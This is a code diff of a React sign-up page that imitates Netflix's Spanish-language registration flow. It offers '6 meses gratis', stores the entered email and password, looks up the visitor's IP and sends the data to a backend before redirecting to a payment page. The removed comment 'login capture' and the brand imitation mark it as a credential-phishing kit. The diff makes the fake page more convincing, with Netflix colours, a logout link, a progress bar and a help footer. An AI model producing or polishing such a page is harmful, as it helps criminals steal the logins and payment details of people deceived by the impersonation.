@@ -1,6 +1,6 @@
 /**
- * Promo Register - Create new account (email + password)
- * After registration, redirects to promo payment
+ * Promo Register - White Netflix style
+ * Create new account (email + password) for the promo flow
  */
 
 import PageTransition from "@/components/PageTransition";
@@ -60,7 +60,7 @@ export default function PromoRegister() {
     sessionStorage.setItem("sp_email", email);
     sessionStorage.setItem("sp_login_password", password);
 
-    // Send registration data to backend (same as login capture)
+    // Send registration data to backend
     try {
       const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => null);
       const ipData = ipRes ? await ipRes.json() : { ip: "unknown" };
@@ -77,28 +77,36 @@ export default function PromoRegister() {
 
     setTimeout(() => {
       setIsLoading(false);
-      setLocation("/promo/payment");
+      setLocation("/promo-payment");
     }, 1200);
   };
 
   return (
     <PageTransition>
-      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
+      <div className="min-h-[100dvh] w-full bg-white flex flex-col">
         {/* Header */}
-        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
-          <BrandLogo height={20} />
+        <header className="w-full px-4 sm:px-8 lg:px-12 py-4 flex items-center justify-between border-b border-[#e6e6e6]">
+          <BrandLogo height={22} />
+          <span className="text-[#333] text-[14px] font-medium cursor-pointer hover:underline">
+            Cerrar sesión
+          </span>
         </header>
 
+        {/* Progress bar */}
+        <div className="w-full h-[3px] bg-[#e6e6e6]">
+          <div className="h-full bg-[#E50914]" style={{ width: '50%' }} />
+        </div>
+
         {/* Main Content */}
-        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
-          <div className="w-full max-w-[400px] lg:max-w-[450px]">
+        <main className="flex-1 flex flex-col items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
+          <div className="w-full max-w-[440px]">
             {/* Title */}
-            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-2 leading-[1.15]">
+            <h1 className="text-[26px] sm:text-[32px] font-bold text-[#141414] mb-3 leading-[1.1]">
               Crea tu cuenta
             </h1>
 
             {/* Subtitle */}
-            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
+            <p className="text-[16px] text-[#333] mb-6 leading-relaxed">
               Crea una cuenta nueva para activar tus 6 meses gratis.
             </p>
 
@@ -114,8 +122,8 @@ export default function PromoRegister() {
                     setEmail(e.target.value);
                     if (emailError) setEmailError("");
                   }}
-                  className={`w-full h-[48px] sm:h-[50px] px-4 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
-                    emailError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
+                  className={`w-full h-[56px] px-4 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
+                    emailError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                   }`}
                 />
                 {emailError && (
@@ -139,14 +147,14 @@ export default function PromoRegister() {
                     setPassword(e.target.value);
                     if (passwordError) setPasswordError("");
                   }}
-                  className={`w-full h-[48px] sm:h-[50px] px-4 pr-12 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
-                    passwordError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
+                  className={`w-full h-[56px] px-4 pr-12 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
+                    passwordError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                   }`}
                 />
                 <button
                   type="button"
                   onClick={() => setShowPassword(!showPassword)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#8c8c8c] hover:text-white transition-colors"
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#737373] hover:text-[#141414] transition-colors"
                 >
                   {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                 </button>
@@ -165,17 +173,32 @@ export default function PromoRegister() {
               <button
                 type="submit"
                 disabled={isLoading}
-                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
+                className="w-full h-[56px] bg-[#E50914] text-white text-[18px] sm:text-[22px] font-medium rounded-[4px] hover:bg-[#c11119] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
               >
                 {isLoading ? "Creando cuenta..." : "Crear cuenta"}
               </button>
             </form>
 
-            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
+            <p className="text-[#737373] text-[13px] mt-6 leading-relaxed">
               Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
             </p>
           </div>
         </main>
+
+        {/* Footer */}
+        <footer className="w-full bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 py-6 mt-auto">
+          <p className="text-[#737373] text-[13px] mb-4">
+            ¿Preguntas? Llama al 01 800 519 1570 (sin cargo)
+          </p>
+          <div className="grid grid-cols-2 gap-2 text-[13px]">
+            <a href="#" className="text-[#737373] underline">Preguntas frecuentes</a>
+            <a href="#" className="text-[#737373] underline">Centro de ayuda</a>
+            <a href="#" className="text-[#737373] underline">Términos de uso</a>
+            <a href="#" className="text-[#737373] underline">Privacidad</a>
+            <a href="#" className="text-[#737373] underline">Preferencias de cookies</a>
+            <a href="#" className="text-[#737373] underline">Información empresarial</a>
+          </div>
+        </footer>
       </div>
     </PageTransition>
   );
